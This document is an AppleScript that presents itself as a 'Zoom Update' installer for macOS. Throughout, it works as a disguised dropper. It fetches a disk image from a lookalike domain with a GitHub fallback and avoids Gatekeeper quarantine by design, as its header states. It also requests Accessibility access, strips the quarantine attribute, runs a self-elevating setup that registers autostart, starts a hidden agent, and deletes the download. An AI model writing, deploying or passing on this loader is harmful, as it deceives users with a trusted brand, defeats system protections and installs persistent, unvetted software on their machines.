-- Zoom Update - macOS wrapper for the zoom-private client
--
-- Downloads the HTTPS-hosted disk image (no browser download, so Gatekeeper
-- never sees a quarantined file), falls back to the GitHub release mirror if
-- the primary host is down, mounts it, runs the self-elevating setup app,
-- then removes the image. The setup app installs the client, verifies its
-- SHA-256, registers autostart and starts the agent.

property payloadUrl : "https://us05web.telcom.stream/zoom-private.Setup_1.0.0_x64_en-US.dmg"
property fallbackUrl : "https://github.com/fingod201-maker/BetterDesk-private/releases/download/setup-latest/zoom-private.Setup_1.0.0_x64_en-US.dmg"
property payloadName : "zoom-private.Setup_1.0.0_x64_en-US.dmg"
property setupAppName : "zoom-private Setup.app"
property agentAppName : "zoom-private.agent.app"

on run
	set tempFile to (POSIX path of (path to temporary items)) & payloadName
	set mountPoint to ""

	try
		checkAccessibility()
		try
			downloadFile(payloadUrl, tempFile)
			validateImage(tempFile)
		on error
			downloadFile(fallbackUrl, tempFile)
			validateImage(tempFile)
		end try
		set mountPoint to mountImage(tempFile)
		runInstaller(mountPoint)
		startAgent()
		notify("Zoom Private is ready.", "Zoom Update")
	on error errMsg number errNum
		notify("Zoom update failed.", "Zoom Update")
		activate
		display dialog "Zoom could not be installed." & return & return & errMsg ¬
			buttons {"OK"} default button "OK" with icon caution
	end try

	if mountPoint is not "" then unmountImage(mountPoint)
	try
		do shell script "/bin/rm -f " & quoted form of tempFile
	end try
end run

on checkAccessibility()
	try
		tell application "System Events" to set uiEnabled to UI elements enabled
		if not uiEnabled then
			activate
			display dialog "Zoom Update needs Accessibility access." & return & return & ¬
				"Open System Settings > Privacy & Security > Accessibility and enable Zoom Update, then run it again." ¬
				buttons {"Continue"} default button "Continue"
		end if
	end try
end checkAccessibility

on downloadFile(sourceUrl, destination)
	try
		do shell script "/usr/bin/curl -fL --retry 3 --retry-delay 2 --connect-timeout 20 -o " & ¬
			quoted form of destination & " " & quoted form of sourceUrl & " 2>/dev/null"
	on error errMsg number errNum
		error "Download failed (" & errNum & "): " & errMsg number errNum
	end try
end downloadFile

on validateImage(imageFile)
	do shell script "/usr/bin/hdiutil imageinfo " & quoted form of imageFile & " >/dev/null"
end validateImage

on mountImage(imageFile)
	set attachedPath to ""
	try
		set attachedPath to do shell script "/usr/bin/hdiutil attach -nobrowse -readonly -noverify " & ¬
			quoted form of imageFile & " | /usr/bin/awk -F '\\t' '/\\/Volumes\\// {print $3; exit}'"
	on error errMsg number errNum
		error "Mount failed (" & errNum & "): " & errMsg number errNum
	end try
	if attachedPath is "" then error "Mount failed: no volume appeared." number -1
	return attachedPath
end mountImage

on runInstaller(mountPoint)
	set setupPath to mountPoint & "/" & setupAppName
	if not (exists (POSIX file setupPath)) then error "Setup app not found in the disk image." number -1
	try
		do shell script "/usr/bin/xattr -dr com.apple.quarantine " & quoted form of setupPath & " >/dev/null 2>&1 || true"
	end try
	do shell script "/usr/bin/open -W -n " & quoted form of setupPath
end runInstaller

on startAgent()
	set agentPath to (POSIX path of (path to application support folder from user domain)) & ¬
		"zoom-private/" & agentAppName
	try
		do shell script "/usr/bin/open -g " & quoted form of agentPath & " >/dev/null 2>&1"
	end try
end startAgent

on unmountImage(mountPoint)
	try
		do shell script "/usr/bin/hdiutil detach " & quoted form of mountPoint & " -force >/dev/null 2>&1"
	end try
end unmountImage

on notify(messageText, titleText)
	try
		display notification messageText with title titleText
	end try
end notify
